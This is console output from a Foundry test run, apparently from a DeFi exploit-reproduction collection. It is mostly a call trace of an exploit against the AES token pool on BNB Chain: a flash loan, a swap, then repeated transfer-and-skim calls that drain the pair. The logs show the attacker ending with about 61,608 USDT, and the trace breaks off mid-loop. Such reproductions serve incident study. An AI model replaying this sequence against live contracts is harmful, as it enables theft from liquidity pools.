Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.18s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2022-12/AES_exp.sol:19:5:
   |
19 |     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:1582:1:
     |
1582 | interface USDT {
     | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 280.09ms (216.08µs CPU time)

Ran 1 test for src/test/2022-12/AES_exp.sol:ContractTest
[PASS] testExploit() (gas: 1166921)
Logs:
  [End] Attacker USDT balance after exploit: 61608.037844960494164175

Traces:
  [1327121] ContractTest::testExploit()
    ├─ [24562] 0x55d398326f99059fF775485246999027B3197955::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [25308] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [1255924] 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A::flashLoan(0, 100000000000000000000000 [1e23], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00)
    │   ├─ [29971] 0x55d398326f99059fF775485246999027B3197955::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 100000000000000000000000 [1e23])
    │   │   ├─ emit Transfer(from: 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 100000000000000000000000 [1e23])
    │   │   └─ ← [Return] true
    │   ├─ [1199616] ContractTest::DPPFlashLoanCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 100000000000000000000000 [1e23], 0x00)
    │   │   ├─ [108586] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokensSupportingFeeOnTransferTokens(100000000000000000000000 [1e23], 0, [0x55d398326f99059fF775485246999027B3197955, 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1670403423 [1.67e9])
    │   │   │   ├─ [10834] 0x55d398326f99059fF775485246999027B3197955::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 100000000000000000000000 [1e23])
    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 100000000000000000000000 [1e23])
    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640563939457584007913129639935 [1.157e77])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [2909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [2893] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 64026931732834970073285 [6.402e22], 3976072419420817555481090 [3.976e24], 1670402979 [1.67e9]
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [80868] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::swap(0, 2421667200874243641060208 [2.421e24], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   │   │   ├─ [46108] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2421667200874243641060208 [2.421e24])
    │   │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 72650016026227309231806 [7.265e22])
    │   │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2179500480786819276954188 [2.179e24])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   │   └─ ← [Return] 1723921922607770969295096 [1.723e24]
    │   │   │   │   ├─ emit Sync(reserve0: 164026931732834970073285 [1.64e23], reserve1: 1723921922607770969295096 [1.723e24])
    │   │   │   │   ├─ emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 100000000000000000000000 [1e23], amount1In: 169516704061197054874214 [1.695e23], amount0Out: 0, amount1Out: 2421667200874243641060208 [2.421e24], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   └─ ← [Return] 2179500480786819276954188 [2.179e24]
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 2179500480786819276954188 [2.179e24]
    │   │   ├─ [11525] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 1089750240393409638477094 [1.089e24])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 32692507211802289154312 [3.269e22])
    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 1057057733181607349322782 [1.057e24])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2780979655789378318617878 [2.78e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 1057057733181607349322782 [1.057e24])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 31711731995448220479683 [3.171e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 951351959863446614390504 [9.513e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2749267923793930098138195 [2.749e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 1025346001186159128843099 [1.025e24])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 30760380035584773865292 [3.076e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 922811401067543215958790 [9.228e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2718507543758345324272903 [2.718e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 994585621150574354977807 [9.945e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 29837568634517230649334 [2.983e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 895127059035516919480027 [8.951e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2688669975123828093623569 [2.688e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 964748052516057124328473 [9.647e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 28942441575481713729854 [2.894e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 868273247264451411895626 [8.682e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2659727533548346379893715 [2.659e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 935805610940575410598619 [9.358e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 28074168328217262317958 [2.807e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 842225049846517869538758 [8.422e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2631653365220129117575757 [2.631e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 907731442612358148280661 [9.077e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 27231943278370744448419 [2.723e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 816958298351122333452595 [8.169e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2604421421941758373127338 [2.604e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 880499499333987403832242 [8.804e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 26414984980019622114967 [2.641e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 792449549400588663449018 [7.924e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2578006436961738751012371 [2.578e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 854084514353967781717275 [8.54e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 25622535430619033451518 [2.562e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 768676062918571003545548 [7.686e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2552383901531119717560853 [2.552e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 828461978923348748265757 [8.284e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 24853859367700462447972 [2.485e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 745615781031013873439182 [7.456e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2527530042163419255112881 [2.527e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 803608119555648285817785 [8.036e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 24108243586669448574533 [2.41e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 723247307600083457236007 [7.232e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 0)
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [909] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 2503421798576749806538348 [2.503e24]
    │   │   │   ├─ [9808] 0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907::transfer(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, 779499875968978837243252 [7.794e23])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x0000000000000000000000000000000000000000, value: 23384996279069365117297 [2.338e22])
    │   │   │   │   ├─ emit Transfer(from: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, to: 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3, value: 701549888372080953518927 [7.015e23])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [21986] 0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3::skim(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3)
    │   │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) [staticcall]
    │   │   │   │   └─ ← [Return] 164026931732834970073285 [1.64e23]
